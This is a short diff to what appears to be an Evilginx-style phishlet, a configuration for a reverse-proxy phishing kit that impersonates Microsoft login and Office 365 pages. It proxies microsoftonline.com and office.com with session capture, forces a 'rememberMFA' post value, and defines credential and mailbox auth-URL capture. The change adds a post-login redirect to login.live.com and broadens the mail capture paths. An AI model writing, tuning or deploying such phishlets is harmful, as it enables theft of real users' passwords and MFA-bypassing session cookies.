@@ -1,5 +1,6 @@
 author: '@brokenc0de'
 min_ver: '3.0.0'
+redirect_url: 'https://login.live.com'
 proxy_hosts:
   - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
@@ -154,12 +155,7 @@ force_post:
       - {key: 'rememberMFA', value: 'true'}
     type: 'post'
 auth_urls:
-  - "/mail/inbox"
-  - "/mail/0"
-  - "/mail/1"
-  - "/mail/2"
-  - "/mail/3"
-  - "/mail/4"
+  - "/mail/*"
 credentials:
   username:
     key: ""
